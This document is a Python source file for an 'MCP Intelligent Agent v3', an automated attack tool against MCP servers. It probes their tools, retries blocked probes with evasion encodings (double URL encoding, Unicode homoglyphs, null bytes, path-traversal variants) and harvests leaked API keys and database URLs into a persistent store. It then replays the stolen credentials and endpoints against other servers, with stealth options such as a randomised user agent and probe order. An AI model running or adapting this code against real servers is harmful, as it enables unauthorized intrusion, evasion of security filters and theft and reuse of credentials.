"""
MCP Intelligent Agent v3

A true reasoning agent that:
1. Re-plans after each phase based on discoveries
2. Persists knowledge between runs (learns what works)
3. Crafts contextual follow-ups (not regex-based)
4. Correlates findings across multiple servers
5. Adapts when probes are blocked (tries alternate encodings/framings)

Requires: Python 3.12+
"""
from __future__ import annotations

import json
import random
import time
import hashlib
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any

import httpx

from mcp_agent_v2 import (
    send, jsonrpc, StealthConfig, Finding, Evidence,
    generate_adaptive_probes, test_resources, test_prompts, test_sampling,
    generate_report,
)

type JsonResponse = dict[str, Any] | str

KNOWLEDGE_FILE = Path("knowledge_base.json")


# ============================================================
# 2. PERSISTENCE — Knowledge Base
# ============================================================

@dataclass
class KnowledgeBase:
    """Persists across runs. Remembers what worked, what was blocked, target profiles."""
    targets: dict[str, dict] = field(default_factory=dict)
    successful_probes: list[dict] = field(default_factory=list)
    blocked_probes: list[dict] = field(default_factory=list)
    leaked_credentials: list[str] = field(default_factory=list)
    leaked_endpoints: list[str] = field(default_factory=list)
    last_run: str = ""

    def save(self):
        self.last_run = datetime.now().isoformat()
        KNOWLEDGE_FILE.write_text(json.dumps({
            "targets": self.targets,
            "successful_probes": self.successful_probes[-100:],
            "blocked_probes": self.blocked_probes[-100:],
            "leaked_credentials": list(set(self.leaked_credentials))[:50],
            "leaked_endpoints": list(set(self.leaked_endpoints))[:50],
            "last_run": self.last_run,
        }, indent=2), encoding="utf-8")

    @classmethod
    def load(cls) -> "KnowledgeBase":
        if KNOWLEDGE_FILE.exists():
            data = json.loads(KNOWLEDGE_FILE.read_text(encoding="utf-8"))
            return cls(**{k: v for k, v in data.items() if k in cls.__dataclass_fields__})
        return cls()

    def record_success(self, target: str, tool: str, probe: str, response: str):
        self.successful_probes.append({"target": target, "tool": tool, "probe": probe, "time": datetime.now().isoformat()})
        # Extract credentials/endpoints from response
        for pattern in ["AKIA", "sk-", "ghp_", "postgres://", "mysql://", "mongodb://", "redis://"]:
            if pattern in response:
                idx = response.index(pattern)
                val = response[idx:idx+80].split('"')[0].split("'")[0].split(" ")[0].split("\n")[0]
                if pattern.endswith("://"):
                    self.leaked_endpoints.append(val)
                else:
                    self.leaked_credentials.append(val)

    def record_block(self, target: str, tool: str, probe: str, error: str):
        self.blocked_probes.append({"target": target, "tool": tool, "probe": probe, "error": error[:100], "time": datetime.now().isoformat()})

    def get_working_probes_for(self, tool_type: str) -> list[str]:
        """Return probes that worked before on similar tools."""
        return [p["probe"] for p in self.successful_probes if tool_type in p.get("tool", "").lower()]


# ============================================================
# 1. REASONING LOOP — Planner
# ============================================================

@dataclass
class AgentState:
    """Current state the reasoning loop uses to decide next actions."""
    url: str
    tools: list[dict] = field(default_factory=list)
    resources: list[dict] = field(default_factory=list)
    prompts: list[dict] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    blocked_count: int = 0
    phase: int = 0
    priority_tools: list[str] = field(default_factory=list)
    discovered_db: bool = False
    discovered_files: bool = False
    discovered_secrets: bool = False
    discovered_http: bool = False


def plan_next_phase(state: AgentState, kb: KnowledgeBase) -> list[dict]:
    """Reasoning loop: decide what to do next based on current state."""
    actions = []

    match state.phase:
        case 0:
            actions.append({"action": "enumerate", "reason": "Initial discovery"})

        case 1:
            # After enumeration — prioritize based on what we found
            if state.resources:
                actions.append({"action": "test_resources", "reason": f"Found {len(state.resources)} resources — often less protected"})
            if state.prompts:
                actions.append({"action": "test_prompts", "reason": f"Found {len(state.prompts)} prompts — may contain secrets"})
            actions.append({"action": "test_sampling", "reason": "Check if we can make server call LLM for us"})

        case 2:
            # After resources/prompts — plan tool probing based on discoveries
            # Prioritize tools based on what resources revealed
            if state.discovered_db:
                state.priority_tools = [t["name"] for t in state.tools if any(k in t.get("name", "").lower() for k in ("db", "query", "sql"))]
                actions.append({"action": "probe_priority", "reason": f"Database discovered — prioritizing SQL tools: {state.priority_tools}"})
            if state.discovered_secrets:
                state.priority_tools += [t["name"] for t in state.tools if any(k in t.get("name", "").lower() for k in ("secret", "vault", "key"))]
                actions.append({"action": "probe_priority", "reason": "Secrets discovered — prioritizing vault tools"})
            if state.discovered_files:
                state.priority_tools += [t["name"] for t in state.tools if any(k in t.get("name", "").lower() for k in ("file", "read", "fs"))]
                actions.append({"action": "probe_priority", "reason": "Files discovered — prioritizing filesystem tools"})

            # Always probe remaining tools
            remaining = [t["name"] for t in state.tools if t["name"] not in state.priority_tools]
            if remaining:
                actions.append({"action": "probe_remaining", "reason": f"Probe {len(remaining)} remaining tools"})

            # Use knowledge base — replay probes that worked before
            if kb.successful_probes:
                actions.append({"action": "replay_known", "reason": f"Replay {len(kb.successful_probes)} historically successful probes"})

        case 3:
            # After probing — chain if we have findings
            if kb.leaked_credentials or kb.leaked_endpoints:
                actions.append({"action": "chain_exploit", "reason": f"Chain {len(kb.leaked_credentials)} creds + {len(kb.leaked_endpoints)} endpoints"})

        case _:
            actions.append({"action": "done", "reason": "All phases complete"})

    return actions


# ============================================================
# 5. EVASION ADAPTATION
# ============================================================

def adapt_probe(original_args: dict, attempt: int) -> dict:
    """When a probe is blocked, try alternate encodings/framings."""
    adapted = dict(original_args)

    for key, value in adapted.items():
        if not isinstance(value, str):
            continue

        match attempt:
            case 1:  # URL encoding
                adapted[key] = value.replace("/", "%2f").replace(" ", "%20").replace(".", "%2e")
            case 2:  # Double encoding
                adapted[key] = value.replace("/", "%252f").replace(".", "%252e")
            case 3:  # Unicode substitution
                adapted[key] = value.replace("a", "\u0430").replace("e", "\u0435").replace("o", "\u043e")
            case 4:  # Case variation
                adapted[key] = "".join(c.upper() if random.random() > 0.5 else c for c in value)
            case 5:  # Null byte injection
                adapted[key] = value + "\x00"
            case 6:  # Path normalization tricks
                adapted[key] = value.replace("../", "..%2f").replace("/etc/", "/./etc/")
            case 7:  # Whitespace tricks
                adapted[key] = value.replace(" ", "\t").replace("/", "/ ")
            case _:
                return adapted  # No more adaptations

    return adapted


def probe_with_evasion(url: str, tool_name: str, probe_name: str, args: dict, stealth: StealthConfig, kb: KnowledgeBase, max_attempts: int = 4) -> tuple[bool, str, Evidence | None]:
    """Try a probe, and if blocked, adapt and retry with different encodings."""
    for attempt in range(max_attempts):
        current_args = args if attempt == 0 else adapt_probe(args, attempt)
        code, resp, ev = send(url, jsonrpc("tools/call", {"name": tool_name, "arguments": current_args}), stealth)

        match resp:
            case {"result": {"content": list(content), "isError": True}}:
                error_text = content[0].get("text", "") if content else ""
                if any(k in error_text.lower() for k in ("blocked", "denied", "forbidden", "security", "rejected")):
                    kb.record_block(url, tool_name, probe_name, error_text)
                    if attempt < max_attempts - 1:
                        continue  # Try next evasion
                    return False, error_text, ev
                return False, error_text, ev

            case {"result": {"content": list(content)}} if not resp.get("result", {}).get("isError"):
                text = content[0].get("text", "") if content else ""
                if text and not any(k in text.lower() for k in ("denied", "blocked", "error", "not found")):
                    kb.record_success(url, tool_name, f"{probe_name}_attempt{attempt}", text)
                    return True, text, ev
                return False, text, ev

            case _:
                return False, str(resp)[:200], ev

    return False, "All evasion attempts failed", None


# ============================================================
# 4. MULTI-SERVER CORRELATION
# ============================================================

def correlate_across_servers(kb: KnowledgeBase, targets: list[str], stealth: StealthConfig) -> list[Finding]:
    """Try leaked credentials/endpoints from one server against others."""
    findings: list[Finding] = []

    if not kb.leaked_credentials and not kb.leaked_endpoints:
        return findings

    for target in targets:
        # Try leaked creds against this target's tools
        _, resp, _ = send(target, jsonrpc("tools/list"), stealth)
        match resp:
            case {"result": {"tools": list(tools)}}:
                for tool in tools:
                    props = tool.get("inputSchema", {}).get("properties", {})
                    for prop_name, prop_schema in props.items():
                        # Try credentials against auth-like fields
                        if any(k in prop_name.lower() for k in ("key", "token", "auth", "secret", "password")):
                            for cred in kb.leaked_credentials[:5]:
                                code, resp2, ev = send(target, jsonrpc("tools/call", {"name": tool["name"], "arguments": {prop_name: cred}}), stealth)
                                match resp2:
                                    case {"result": {"content": list(c)}} if not resp2.get("result", {}).get("isError"):
                                        text = c[0].get("text", "") if c else ""
                                        if text and len(text) > 20 and "denied" not in text.lower():
                                            findings.append(Finding("critical", "cross_server_access",
                                                f"Credential from another server works on {tool['name']}@{target[:30]}",
                                                f"Cred: {cred[:20]}... → {prop_name}", ev))
                                    case _:
                                        pass

                        # Try leaked endpoints against URL fields
                        if any(k in prop_name.lower() for k in ("url", "endpoint", "uri", "target")):
                            for ep in kb.leaked_endpoints[:3]:
                                code, resp2, ev = send(target, jsonrpc("tools/call", {"name": tool["name"], "arguments": {prop_name: ep}}), stealth)
                                match resp2:
                                    case {"result": {"content": list(c)}} if not resp2.get("result", {}).get("isError"):
                                        text = c[0].get("text", "") if c else ""
                                        if text and len(text) > 50:
                                            findings.append(Finding("high", "cross_server_ssrf",
                                                f"Endpoint from Server A accessible via Server B: {ep[:40]}",
                                                f"Via {tool['name']}@{target[:30]}", ev))
                                    case _:
                                        pass
            case _:
                pass

    return findings


# ============================================================
# MAIN AGENT LOOP
# ============================================================

def run_intelligent_agent(targets: list[str], *, stealth_enabled: bool = True, deep: bool = True) -> list[Finding]:
    """The full intelligent agent with reasoning loop."""
    stealth = StealthConfig(enabled=stealth_enabled)
    kb = KnowledgeBase.load()
    all_findings: list[Finding] = []

    print(f"\n  Knowledge base: {len(kb.successful_probes)} past successes, {len(kb.leaked_credentials)} known creds")

    for url in targets:
        state = AgentState(url=url)

        print(f"\n\n  {'═' * 60}")
        print(f"  TARGET: {url}")
        print(f"  {'═' * 60}")

        # Phase 0: Enumerate
        state.phase = 0
        plan = plan_next_phase(state, kb)
        print(f"\n  [PLAN] {[a['reason'] for a in plan]}")

        code, resp, _ = send(url, jsonrpc("initialize", {
            "protocolVersion": "2025-06-18",
            "capabilities": {"tools": {}, "resources": {}, "prompts": {}, "sampling": {}},
            "clientInfo": {"name": stealth.get_ua().split("/")[0], "version": "1.0.0"},
        }), stealth)

        if code != 200:
            print(f"    Connection failed: {code}")
            continue

        send(url, {"jsonrpc": "2.0", "method": "notifications/initialized"}, stealth)

        _, resp, _ = send(url, jsonrpc("tools/list"), stealth)
        match resp:
            case {"result": {"tools": list(t)}}:
                state.tools = t
        print(f"    Tools: {len(state.tools)}")

        _, resp, _ = send(url, jsonrpc("resources/list"), stealth)
        match resp:
            case {"result": {"resources": list(r)}}:
                state.resources = r
                if any("db" in str(res).lower() or "sql" in str(res).lower() for res in r):
                    state.discovered_db = True
                if any("file" in str(res).lower() or "path" in str(res).lower() for res in r):
                    state.discovered_files = True
                if any("secret" in str(res).lower() or "key" in str(res).lower() for res in r):
                    state.discovered_secrets = True

        _, resp, _ = send(url, jsonrpc("prompts/list"), stealth)
        match resp:
            case {"result": {"prompts": list(p)}}:
                state.prompts = p

        # Phase 1: Resources/Prompts/Sampling
        state.phase = 1
        plan = plan_next_phase(state, kb)
        print(f"\n  [PLAN] {[a['reason'] for a in plan]}")

        for action in plan:
            match action["action"]:
                case "test_resources":
                    findings = test_resources(url, stealth)
                    all_findings.extend(findings)
                    # Update state based on findings
                    for f in findings:
                        if "database" in f.details.lower() or "sql" in f.details.lower():
                            state.discovered_db = True
                        if "secret" in f.details.lower() or "credential" in f.details.lower():
                            state.discovered_secrets = True
                case "test_prompts":
                    all_findings.extend(test_prompts(url, stealth))
                case "test_sampling":
                    all_findings.extend(test_sampling(url, stealth))

        # Phase 2: Adaptive probing with reasoning
        state.phase = 2
        plan = plan_next_phase(state, kb)
        print(f"\n  [PLAN] {[a['reason'] for a in plan]}")

        # Probe priority tools first
        priority_set = set(state.priority_tools)
        ordered_tools = [t for t in state.tools if t["name"] in priority_set] + [t for t in state.tools if t["name"] not in priority_set]

        if stealth.randomize_order:
            # Randomize within priority and non-priority groups separately
            priority = [t for t in ordered_tools if t["name"] in priority_set]
            rest = [t for t in ordered_tools if t["name"] not in priority_set]
            random.shuffle(priority)
            random.shuffle(rest)
            ordered_tools = priority + rest

        for tool in ordered_tools:
            probes = generate_adaptive_probes(tool)
            if stealth.randomize_order:
                random.shuffle(probes)

            is_priority = tool["name"] in priority_set
            label = "PRIORITY" if is_priority else "standard"
            print(f"    [{label}] {tool['name']} ({len(probes)} probes)")

            for probe_name, args in probes:
                success, text, ev = probe_with_evasion(url, tool["name"], probe_name, args, stealth, kb)

                if success and text:
                    # Classify finding
                    if any(p in text for p in ["AKIA", "sk-", "ghp_", "-----BEGIN", "postgres://", "mysql://"]):
                        all_findings.append(Finding("critical", "credential_leak", f"{tool['name']}/{probe_name}", text[:100], ev))
                    elif any(p in text for p in ["root:x:0", "/bin/bash"]):
                        all_findings.append(Finding("high", "system_file", f"{tool['name']}/{probe_name}", "", ev))
                    elif any(p in text for p in ["ami-id", "instance-id", "security-credentials"]):
                        all_findings.append(Finding("critical", "ssrf_cloud", f"{tool['name']}/{probe_name}", "", ev))
                    elif any(p in text for p in ["AWS_", "OPENAI_", "DATABASE_URL"]):
                        all_findings.append(Finding("high", "env_leak", f"{tool['name']}/{probe_name}", "", ev))
                    elif len(text) > 100:
                        all_findings.append(Finding("low", "info_disclosure", f"{tool['name']}/{probe_name}", text[:80], ev))

        # Phase 3: Exploit chaining
        state.phase = 3
        if deep and (kb.leaked_credentials or kb.leaked_endpoints):
            plan = plan_next_phase(state, kb)
            print(f"\n  [PLAN] {[a['reason'] for a in plan]}")
            from mcp_agent_v2 import chain_findings
            chained = chain_findings(url, all_findings, state.tools, stealth)
            all_findings.extend(chained)

        # Store target profile
        kb.targets[url] = {
            "name": state.tools[0].get("name", "") if state.tools else "",
            "tool_count": len(state.tools),
            "resource_count": len(state.resources),
            "findings": len(all_findings),
            "last_scan": datetime.now().isoformat(),
        }

    # Phase 4: Multi-server correlation
    if len(targets) > 1 and (kb.leaked_credentials or kb.leaked_endpoints):
        print(f"\n  [CORRELATION] Testing leaked creds/endpoints across {len(targets)} servers...")
        correlated = correlate_across_servers(kb, targets, stealth)
        all_findings.extend(correlated)
        if correlated:
            print(f"    Cross-server findings: {len(correlated)}")

    # Save knowledge base
    kb.save()
    print(f"\n  [KB] Saved: {len(kb.successful_probes)} successes, {len(kb.leaked_credentials)} creds, {len(kb.leaked_endpoints)} endpoints")

    # Generate report
    server_info = {"url": ", ".join(targets), "name": "multi-target" if len(targets) > 1 else targets[0]}
    report_path = generate_report(all_findings, server_info)
    print(f"  [REPORT] {report_path}")

    # Summary
    print(f"\n  {'═' * 60}")
    print(f"  FINDINGS: {len(all_findings)}")
    for sev in ("critical", "high", "medium", "low"):
        count = sum(1 for f in all_findings if f.severity == sev)
        if count:
            print(f"    {sev.upper()}: {count}")
    print(f"  {'═' * 60}")

    return all_findings


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="MCP Intelligent Agent v3")
    parser.add_argument("--url", action="append", required=True, help="Target MCP server URL (can specify multiple)")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    parser.add_argument("--shallow", action="store_true", help="Skip exploit chaining")
    args = parser.parse_args()

    print("=" * 60)
    print("  MCP INTELLIGENT AGENT v3")
    print("  Reasoning | Persistence | Chaining | Correlation | Evasion")
    print("=" * 60)

    run_intelligent_agent(args.url, stealth_enabled=not args.no_stealth, deep=not args.shallow)
